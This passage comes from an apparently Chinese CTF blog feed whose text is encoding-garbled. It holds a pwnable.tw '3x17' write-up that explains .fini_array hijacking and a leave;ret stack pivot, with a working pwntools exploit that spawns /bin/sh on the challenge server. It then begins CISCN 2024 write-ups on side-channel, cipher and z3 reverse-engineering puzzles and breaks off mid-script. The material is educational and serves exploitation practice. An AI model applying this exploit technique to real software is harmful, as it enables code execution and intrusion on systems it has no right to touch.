class="string">"data:"</span>, <span class="number">5uLL</span>);</span><br><span class="line">  read_func(<span class="number">0</span>, v4, <span class="number">0x18</span>uLL);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>ç¨‹åºå¾ˆç›´æ¥åœ°æä¾›äº†ä¸€æ¬¡ä»»æ„åœ°å€å†™çš„æœºä¼šï¼Œåˆç§° <strong>Write What Where (WWW)</strong> ã€‚ä¸è¿‡æˆ‘ä»¬æ²¡æœ‰æ ˆç©ºé—´åœ°å€æ³„éœ²ï¼Œå› æ­¤æš‚æ—¶æ— æ³•ç›´æ¥åˆ©ç”¨æ ˆæ¥ç›´æ¥æ§åˆ¶ä»£ç æµã€‚</p><p>GOT è¡¨åŠ«æŒï¼Ÿæ²¡æœ‰ <code>system</code> å‡½æ•°ã€‚ä½†æ˜¯ <code>Partial RELRO</code> å¯ä¸ä»…ä»…æ„å‘³ç€å¯ä»¥åˆ©ç”¨ GOT è¡¨åŠ«æŒï¼Œä¹Ÿæ„å‘³ç€å¯ä»¥ä½¿ç”¨ <strong>fini_array åŠ«æŒ</strong>ã€‚</p><h2 id="fini-array"><a href="#fini-array" class="headerlink" title=".fini_array"></a><code>.fini_array</code></h2><p><code>.fini_array</code> æ˜¯ä»€ä¹ˆï¼Ÿç®€å•æ¥è¯´ï¼Œå®ƒæ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆæ•°ç»„ï¼Œä¸€æ—¦ç¨‹åºé€€å‡ºå°±ä¼šè¿è¡Œå…¶ä¸­çš„å‡½æ•°ï¼Œä¸è¿‡æ˜¯æŒ‰å€’åºæ–¹å¼ï¼Œä¾‹å¦‚å…ˆè¿è¡Œ <code>.fini_array[1]</code> å†è¿è¡Œ <code>.fini_array[0]</code> ã€‚åªè¦æˆ‘ä»¬èƒ½è¦†å†™è¯¥æ•°ç»„ä¸­çš„å‡½æ•°æŒ‡é’ˆï¼Œæˆ‘ä»¬å°±èƒ½åŠ«æŒä»£ç æµã€‚</p><h3 id="æ— é™å¾ªç¯"><a href="#æ— é™å¾ªç¯" class="headerlink" title="æ— é™å¾ªç¯"></a>æ— é™å¾ªç¯</h3><p>å¾ˆå¤šæ—¶å€™é¢˜ç›®ï¼ˆä¾‹å¦‚è¿™é¢˜ï¼‰ä¸­çš„æ¼æ´æŒ‡åˆ©ç”¨ä¸€æ¬¡æ˜¯ä¸å¤Ÿæˆ‘ä»¬ capture the flag çš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è¾¾åˆ°æ¼æ´çš„é‡å¤åˆ©ç”¨ã€‚ä»¥è¿™é¢˜ä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ï¼š<code>.fini_array[0] == __libc_csu_fini &amp;&amp;.fini_array[1] == main</code></p><ol><li>å½“ç¨‹åºé€€å‡ºæ—¶ï¼Œå…ˆæ‰§è¡Œ <code>main</code> å‡½æ•°ï¼Œä»»æ„å†™åŒ…å«äºå…¶ä¸­ï¼ˆå°½ç®¡ä¼šæ£€æŸ¥<code>0x4B9330</code>åœ°å€å¤„æ˜¯å¦ä¸º1ï¼Œä½†å…¶ç±»å‹ä¸º byte/uint8ï¼Œå› æ­¤<code>1+16 == 1</code>ï¼Œæˆ‘ä»¬ä¸å¿…æ‹…å¿ƒï¼‰ã€‚</li><li>ç„¶åæ‰§è¡Œ <code>__libc_csu_fini</code> å‡½æ•°ã€‚è¯¥å‡½æ•°çš„ä½œç”¨å°±æ˜¯è°ƒç”¨æ‰€æœ‰ <code>.fini_array</code> ä¸­çš„å‡½æ•°ï¼Œäºæ˜¯å›åˆ°æ­¥éª¤1ã€‚å› æ­¤å½¢æˆäº†æ— é™å¾ªç¯ã€‚</li></ol><h3 id="å¦‚ä½•å®šä½-fini-arrayå’Œ-libc-csu-fini-çš„åœ°å€ï¼Ÿ"><a href="#å¦‚ä½•å®šä½-fini-arrayå’Œ-libc-csu-fini-çš„åœ°å€ï¼Ÿ" class="headerlink" title="å¦‚ä½•å®šä½.fini_arrayå’Œ__libc_csu_fini çš„åœ°å€ï¼Ÿ"></a>å¦‚ä½•å®šä½<code>.fini_array</code>å’Œ<code>__libc_csu_fini</code> çš„åœ°å€ï¼Ÿ</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -S ./3x17 | grep .fini_array</span><br></pre></td></tr></tbody></table></figure><p><code>-S</code> å¯ä»¥æ˜¾ç¤ºå„ä¸ªæ®µçš„ header ã€‚</p><p>åœ¨ <code>start</code> å‡½æ•°ä¸­æ‰¾åˆ°ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sub_401EB0(</span><br><span class="line">  (<span class="type">unsigned</span> <span class="type">int</span>)main,</span><br><span class="line">  v4,</span><br><span class="line">  (<span class="type">unsigned</span> <span class="type">int</span>)&amp;retaddr,</span><br><span class="line">  (<span class="type">unsigned</span> <span class="type">int</span>)sub_4028D0,</span><br><span class="line">  (<span class="type">unsigned</span> <span class="type">int</span>)sub_402960,</span><br><span class="line">  a3,</span><br><span class="line">  (__int64)&amp;v5);</span><br><span class="line">__halt();</span><br></pre></td></tr></tbody></table></figure><pre><code># in the `start`, there is a `_libc_start_main`# the `_libc_start_main`'s 4th and 5th arg is `_libc_csu_init`, `_libc_csu_fini`</code></pre><p>æ ¹æ®ç»éªŒ<code>sub_401EB0</code>ä¸º<code>__libc_start_main</code>ï¼Œè€Œ<code>__libc_start_main</code> çš„ç¬¬ 4 å’Œç¬¬ 5 ä¸ªå‚æ•°åˆ†åˆ«æ˜¯ <code>__libc_csu_init</code> å’Œ <code>__libc_csu_fini</code>ã€‚</p><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>æˆ‘ä»¬ç°åœ¨æ‹¥æœ‰äº†æ— é™æ¬¡ä»»æ„åœ°å€å†™çš„æœºä¼šï¼Œä¹ŸçŸ¥é“å¦‚ä½•åˆ©ç”¨ <code>.fini_array</code> æ¥åŠ«æŒä»£ç æµï¼Œæ¥ä¸‹æ¥åšä»€ä¹ˆï¼Ÿ</p><p>é¦–å…ˆï¼Œé™æ€é“¾æ¥çš„ ELF æœ€ä¸ç¼ºçš„å°±æ˜¯ gadgetsã€‚æˆ‘ä»¬å¾ˆå®¹æ˜“æ‰¾åˆ° pop å„ç§å¯„å­˜å™¨ä»¥åŠ <code>syscall</code> çš„ gadgetsã€‚å¾ˆå®¹æ˜“æ„é€  ROP chain ã€‚é‚£ä¹ˆç¦» get shell å°±åªå·®â€”â€”æ ˆã€‚</p><p>æˆ‘ä»¬éœ€è¦å°† ROP chain æ”¾åˆ°æ ˆä¸Šå»ã€‚<code>__libc_csu_fini</code> å‡½æ•°ä¸ºæˆ‘ä»¬åˆ›é€ äº†æ¡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">lea     rax, unk_4B4100</span><br><span class="line">lea     rbp, off_4B40F0</span><br><span class="line">push    rbx</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><p>ä»¥ä¸Šæ˜¯ <code>__libc_csu_fini</code> å‡½æ•°çš„å¼€å¤´ï¼Œå…¶ä¸­<code>lea rbp, off_4B40F0</code>ä¸­çš„<code>0x4B40F0</code>å°±æ˜¯ <code>.fini_array</code> çš„èµ·å§‹åœ°å€ã€‚æ¢è¨€ä¹‹ï¼Œåœ¨è¿è¡Œå®Œ <code>__libc_csu_fini</code> å‡½æ•°åï¼Œ<code>rbp</code> çš„å€¼ä¸º <code>.fini_array</code> çš„èµ·å§‹åœ°å€ã€‚æ¥ä¸‹æ¥åªè¦åˆ©ç”¨ <code>leave ; ret</code> å°±å¯ä»¥è®©è¿”å›åœ°å€ä¸º <code>fini_array + 0x8</code>ã€‚å› ä¸º <code>leave == mov rsp, rbp ; pop rbp</code>ã€‚</p><ol><li><code>mov rsp, rbp</code> : <code>rsp = rbp = .fini_array</code></li><li><code>pop rbp</code> : <code>rbp = .fini_array[0]</code>, <code>rsp = .fini_array + 0x8</code>   </li><li><code>ret</code> : <code>rip = rsp = .fini_array + 0x8</code></li></ol><p>å› æ­¤åªè¦ä»¤<code>.fini_array[0]</code> å¤„ä¸º<code>leave ; ret</code> gadget çš„åœ°å€ï¼Œä¸”ä»<code>.fini_array + 0x8</code> å¼€å§‹ä¸º ROP chain å³å¯ get shell ã€‚</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>ç”±äºåªæ˜¯ä¸€é“ 150 åˆ†çš„é¢˜ï¼Œæ ¹æ® pwnable.tw çš„è§„åˆ™å¯ä»¥å…¬å¼€ä»£ç ç”¨äºå‚è€ƒï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">"./3x17"</span>)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.DEBUG:</span><br><span class="line">            gdb.attach(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="number">10105</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">www</span>(<span class="params">r,addr,data</span>):</span><br><span class="line">    r.sendafter(<span class="string">b"addr:"</span>,<span class="built_in">str</span>(addr).encode())</span><br><span class="line">    r.sendafter(<span class="string">b"data:"</span>,data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    args.LOCAL = <span class="literal">False</span></span><br><span class="line">    r = conn()</span><br><span class="line">    <span class="comment"># `readelf -S ./3x17` to find the addr of .fini_array</span></span><br><span class="line">    <span class="comment"># in the `start`, there is a `__libc_start_main`</span></span><br><span class="line">    <span class="comment"># the `__libc_start_main`'s 4th and 5th arg is `__libc_csu_init`, `__libc_csu_fini`</span></span><br><span class="line"></span><br><span class="line">    fini_array = <span class="number">0x4b40f0</span></span><br><span class="line">    libc_csu_fini = <span class="number">0x402960</span></span><br><span class="line">    main = <span class="number">0x401b6d</span></span><br><span class="line">    leave_ret_addr = <span class="number">0x401c4b</span></span><br><span class="line">    pop_rdi = <span class="number">0x401696</span></span><br><span class="line">    pop_rsi = <span class="number">0x406c30</span></span><br><span class="line">    pop_rdx = <span class="number">0x446e35</span></span><br><span class="line">    pop_rax = <span class="number">0x41e4af</span></span><br><span class="line">    syscall = <span class="number">0x4022b4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># stage1: eternal loop</span></span><br><span class="line">    www(r,fini_array,flat(libc_csu_fini,main))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># stage2: rop chain</span></span><br><span class="line">    www(r, fini_array + <span class="number">0x10</span>, flat(fini_array+<span class="number">0x50</span>, pop_rsi, <span class="number">0</span>))</span><br><span class="line">    www(r, fini_array + <span class="number">0x28</span>, flat(pop_rdx, <span class="number">0</span>, pop_rax))</span><br><span class="line">    www(r, fini_array + <span class="number">0x40</span>, flat(<span class="number">0x3b</span>, syscall) + <span class="string">b'/bin/sh\x00'</span>)</span><br><span class="line">    www(r, fini_array, flat(leave_ret_addr, pop_rdi))</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <summary type="html">è®°å½•ä¸€æ¬¡ pwnable.tw è§£é¢˜è¿‡ç¨‹ä¸­å¯¹ä»¥å‰æœªä½¿ç”¨è¿‡çš„æŠ€æœ¯çš„å­¦ä¹ ã€‚</summary>
    
    
    
    <category term="CTF" scheme="https://blog.beacox.space/categories/CTF/"/>
    
    
    <category term="PWN" scheme="https://blog.beacox.space/tags/PWN/"/>
    
    <category term="ROP" scheme="https://blog.beacox.space/tags/ROP/"/>
    
    <category term=".fini_array" scheme="https://blog.beacox.space/tags/fini-array/"/>
    
  </entry>
  
  <entry>
    <title>ç¬¬åä¸ƒå±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆ›æ–°å®è·µèƒ½åŠ›èµ›åˆèµ› Writeup</title>
    <link href="https://blog.beacox.space/posts/ciscn-2024-wp/"/>
    <id>https://blog.beacox.space/posts/ciscn-2024-wp/</id>
    <published>2024-05-20T04:00:00.000Z</published>
    <updated>2024-05-20T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>æ¢¦å¼€å§‹çš„æ¯”èµ›ã€‚å»å¹´çº¯å°ç™½ç›´æ¥å‚èµ›ï¼Œç»“æœè‡ªç„¶æ˜¯è¢«è¡€è™ã€‚ä¹‹åå¼€å§‹æ…¢æ…¢å­¦ï¼Œä»Šå¹´æ€»ç®—æ˜¯åšå‡ºäº›é¢˜ã€‚ä¸è¿‡éš¾ä¸€äº›çš„ PWN é¢˜è¿˜æ˜¯åšä¸å‡ºâ€¦â€¦ï¼ˆ ï¼‰ï¼Œå°±å¤šç»ƒã€‚</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ç«é”…é“¾è§‚å…‰æ‰“å¡"><a href="#ç«é”…é“¾è§‚å…‰æ‰“å¡" class="headerlink" title="ç«é”…é“¾è§‚å…‰æ‰“å¡"></a>ç«é”…é“¾è§‚å…‰æ‰“å¡</h3><p>ç­¾åˆ°é¢˜ã€‚</p><p>æµè§ˆå™¨å®‰è£…ä¸€ä¸ª MetaMask é’±åŒ…ç”¨äºåŒºå—é“¾æ“ä½œã€‚è¿æ¥é’±åŒ…åç­”é¢˜ï¼Œæ”¶é›†ä»»æ„7ä¸ªä¸åŒé£Ÿæå›¾ç‰‡åï¼Œç‚¹å‡»å…‘æ¢ NFT ï¼Œå¾—åˆ°å« flag çš„å›¾ç‰‡:<br><img src="https://bu.dusays.com/2024/05/20/664abdea520d8.jpeg" class="lazyload" data-srcset="https://bu.dusays.com/2024/05/20/664abdea520d8.jpeg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="hotpot"><br>å¾—åˆ° flag ï¼š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{y0u_ar3_hotpot_K1ng}</span><br></pre></td></tr></tbody></table></figure><h3 id="Power-Trajectory-Diagram"><a href="#Power-Trajectory-Diagram" class="headerlink" title="Power_Trajectory_Diagram"></a>Power_Trajectory_Diagram</h3><p>è¿™æ˜¯ä¸€é“åŸºäºåŠŸè€—åˆ†æçš„ä¾§ä¿¡é“æ”»å‡»é¢˜ï¼Œæœç´¢ç›¸å…³å…³é”®è¯ï¼Œåœ¨çœ‹é›ªä¸Šæ‰¾åˆ°ä¸€ç¯‡<a href="https://bbs.kanxue.com/thread-260429.htm">æ–‡ç« </a>ã€‚æ ¹æ®æ–‡ç« å†…å®¹å¯çŸ¥ï¼Œè¾“å…¥å¯†ç é€ä½æ¯”å¯¹ï¼Œè¾“å…¥æ­£ç¡®æ—¶å’Œé”™è¯¯æ—¶åŠŸè€—æ›²çº¿æœ‰æ˜æ˜¾ä¸åŒã€‚</p><p>å°†å¾—åˆ°çš„ npz åŠ è½½åæ‰“å°æ•°æ®ï¼Œå‘ç°ä¸€å…±æœ‰13*40ç»„æ•°æ®ï¼Œ40å¯¹åº”ç€40ä¸ªå­—ç¬¦ï¼ŒçŒœæµ‹13ä¸ºå¯†ç ä½æ•°ã€‚æ‰“å°æ‰€æœ‰åŠŸè€—æ›²çº¿ï¼Œå¯ä»¥å‘ç°ï¼š<br><img src="https://bu.dusays.com/2024/05/20/664abe102daf5.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/05/20/664abe102daf5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="trace36"><br><img src="https://bu.dusays.com/2024/05/20/664abe1fcc283.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/05/20/664abe1fcc283.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="trace37"><br>æ¯40ç»„æ›²çº¿ä¸­ï¼Œä¼šæœ‰ä¸€ç»„æ›²çº¿çš„æœ€å¤§æ³¢åŠ¨å¤„æ¨ªåæ ‡æ˜æ˜¾å³ç§»ï¼Œä¾‹å¦‚ä¸Šå›¾ç¬¬37ç»„æ›²çº¿æœ€å¤§æ³¢åŠ¨å¤„ç›¸æ¯”äºç¬¬36ç»„ä»¥åŠå…¶ä»–1-40ç»„çš„æœ€å¤§æ³¢åŠ¨å¤„éƒ½æœ‰ä¸€å®šç¨‹åº¦å³ç§»ã€‚æ¨æµ‹æ˜¯å¯†ç é”™è¯¯æ—¶ä¼šå‡ºç°æœ€å¤§æ³¢åŠ¨ï¼Œè€Œç¬¬37ç»„æœ€å¤§æ³¢åŠ¨å³ç§»ä»£è¡¨ç€å½“å‰è¾“å…¥çš„å¯†ç å­—ç¬¦æ˜¯æ­£ç¡®çš„ï¼Œé”™è¯¯å‘ç”Ÿåœ¨ä¸‹ä¸€ä½ã€‚<br>ä½¿ç”¨è¿™ç§æ–¹æ³•å¯ä»¥æ‰¾åˆ°æ¯40ç»„æ›²çº¿ä¸­æœ€ç‰¹æ®Šçš„ä¸€ç»„ï¼Œå¹¶æ˜ å°„ä¸ºç›¸åº”çš„å­—ç¬¦ã€‚ï¼ˆé™¤äº†ç¬¬481ç»„åˆ°ç¬¬520ç»„ï¼Œå› æ­¤è®¤ä¸ºå¯†ç åªæœ‰12ä½)<br>ç‰¹æ®Šæ›²çº¿åˆ°å­—ç¬¦çš„æ˜ å°„è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'i'</span>, <span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'l'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'o'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>, <span class="string">'r'</span>,</span><br><span class="line"><span class="string">'s'</span>, <span class="string">'t'</span>, <span class="string">'u'</span>, <span class="string">'v'</span>, <span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>, <span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>,</span><br><span class="line"><span class="string">'_'</span>, <span class="string">'!'</span>, <span class="string">'@'</span>, <span class="string">'#'</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = [</span><br><span class="line"><span class="number">37</span>,</span><br><span class="line"><span class="number">43</span>,</span><br><span class="line"><span class="number">89</span>,</span><br><span class="line"><span class="number">139</span>,</span><br><span class="line"><span class="number">163</span>,</span><br><span class="line"><span class="number">214</span>,</span><br><span class="line"><span class="number">277</span>,</span><br><span class="line"><span class="number">309</span>,</span><br><span class="line"><span class="number">347</span>,</span><br><span class="line"><span class="number">389</span>,</span><br><span class="line"><span class="number">431</span>,</span><br><span class="line"><span class="number">477</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">password = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    tmp = <span class="built_in">list</span>[i] - i*<span class="number">40</span> -<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br><span class="line">    password += data[tmp]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></tbody></table></figure><p>å¾—åˆ°ç»“æœ<code>_ciscn_2024_</code>ï¼Œå› æ­¤ flag ä¸ºï¼š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{_ciscn_2024_}</span><br></pre></td></tr></tbody></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="å¤å…¸å¯†ç "><a href="#å¤å…¸å¯†ç " class="headerlink" title="å¤å…¸å¯†ç "></a>å¤å…¸å¯†ç </h3><p>é¢˜ç›®ç»™äº†ä¸€ä¸ªå­—ç¬¦ä¸²<code>AnU7NnR4NassOGp3BDJgAGonMaJayTwrBqZ3ODMoMWxgMnFdNqtdMTM9</code>ï¼Œæ²¡æœ‰è¯´æ˜ç»è¿‡ä½•ç§å¤„ç†ã€‚<br>æ”¾åˆ° <a href="https://gchq.github.io/CyberChef/#recipe=Atbash_Cipher()From_Base64('A-Za-z0-9%2B/%3D',true,false)&amp;input=QW5VN05uUjROYXNzT0dwM0JESmdBR29uTWFKYXlUd3JCcVozT0RNb01XeGdNbkZkTnF0ZE1UTTk">CyberChef</a> é€‰æ‹© Encrption / Encoding é€ä¸ªå°è¯•ï¼Œç”¨ Atbash Cipher è§£å¯†å Base64 è§£ç ï¼Œå¾—åˆ°ï¼š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fa{2b838a-97ad-e9f743lgbb07-ce47-6e02804c}</span><br></pre></td></tr></tbody></table></figure><p>æ ¹æ®é¢˜ç›®çš„æç¤ºæƒ³åˆ°æ …æ å¯†ç ï¼Œå°†å­—ç¬¦ä¸²å¯¹åŠåˆ†ï¼Œç„¶åZå½¢æ‹¼æ¥å°±èƒ½å¾—åˆ° flagï¼š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{b2bb0873-8cae-4977-a6de-0e298f0744c3}</span><br></pre></td></tr></tbody></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="gdb-debug"><a href="#gdb-debug" class="headerlink" title="gdb_debug"></a>gdb_debug</h3><p>IDAåç¼–è¯‘ï¼Œæ³¨æ„åˆ°ç¨‹åºä¸­è®¾ç½®éšæœºæ•°ç§å­çš„ä»£ç ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v3 = time(<span class="number">0LL</span>);</span><br><span class="line">srand(v3 &amp; <span class="number">0xF0000000</span>);</span><br></pre></td></tr></tbody></table></figure><p>å®é™…ä¸Šéšæœºæ•°ç§å­æ’ä¸º0x60000000ï¼Œå› æ­¤è¯¥ç¨‹åºä¸­çš„éšæœºæ•°éƒ½å¯ä»¥ç¡®å®šï¼Œå¯ä»¥ä½¿ç”¨ ctypes æ¥è°ƒç”¨ libc åº“è®¾ç½®ç›¸åº”çš„éšæœºæ•°ç§å­ï¼Œè·å–æ¯ä¸€æ¬¡è°ƒç”¨ <code>rand()</code> è¿”å›çš„éšæœºæ•°ã€‚å‰©ä¸‹çš„å°±æ˜¯æ ¹æ®åç¼–è¯‘çš„ç¨‹åºä½¿ç”¨ z3 è¿›è¡Œçº¦æŸæ±‚è§£ï¼Œexp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = CDLL(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">libc.srand(<span class="number">0x60000000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialization</span></span><br><span class="line">flag_len = <span class="number">38</span></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a list of BitVec variables to represent the flag</span></span><br><span class="line">flag_chars = [BitVec(<span class="string">f'flag_<span class="subst">{i}</span>'</span>, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(flag_len)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add constraints</span></span><br><span class="line">solver.add(flag_chars[<span class="number">0</span>] == <span class="built_in">ord</span>(<span class="string">'f'</span>))</span><br><span class="line">solver.add(flag_chars[<span class="number">1</span>] == <span class="built_in">ord</span>(<span class="string">'l'</span>))</span><br><span class="line">solver.add(flag_chars[<span class="number">2</span>] == <span class="built_in">ord</span>(<span class="string">'a'</span>))</span><br><span class="line">solver.add(flag_chars[<span class="number">3</span>] == <span class="built_in">ord</span>(<span class="string">'g'</span>))</span><br><span class="line">solver.add(flag_chars[<span class="number">4</span>] == <span class="built_in">ord</span>(<span class="string">'{'</span>))</span><br><span class="line">solver.add(flag_chars[flag_len-<span class="number">1</span>] == <span class="built_in">ord</span>(<span class="string">'}'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: XOR with rand</span></span><br><span class="line">v28 = 